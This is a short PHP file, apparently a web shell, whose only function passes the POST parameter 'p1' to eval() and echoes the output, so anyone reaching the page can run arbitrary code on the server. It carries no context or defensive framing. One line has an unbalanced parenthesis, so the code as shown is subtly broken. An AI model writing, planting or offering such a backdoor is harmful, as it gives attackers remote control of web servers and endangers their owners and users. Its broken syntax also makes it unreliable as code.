<?php
function actionPhp() {
	ob_start();
	eval($_POST['p1']);
	$temp = addcslashes(htmlspecialchars(ob_get_clean());
	echo $temp;
	exit; 
}

actionPhp();
?>